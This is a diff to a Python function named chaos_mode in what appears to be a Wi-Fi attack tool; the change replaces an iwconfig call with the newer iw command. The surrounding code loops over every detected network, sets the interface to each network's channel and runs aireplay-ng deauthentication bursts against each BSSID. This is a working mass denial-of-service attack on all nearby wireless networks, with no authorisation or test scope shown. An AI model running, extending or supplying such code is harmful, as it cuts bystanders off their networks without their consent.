@@ -101,7 +101,7 @@ def chaos_mode(iface):
             print(t("strike_chaos_round_start", round=tur_sayisi))
             for net in networks:
                 print(t("strike_chaos_shockwave", essid=net['essid'][:15], bssid=net['bssid'], ch=net['ch']))
-                engine.run_cmd(["sudo", "iwconfig", iface, "channel", net['ch']])
+                engine.run_cmd(["sudo", "iw", "dev", iface, "set", "channel", net['ch']])
                 cmd = ["sudo", "aireplay-ng", "-0", "20", "-a", net['bssid'], iface]
                 subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print(t("strike_chaos_round_end", round=tur_sayisi))
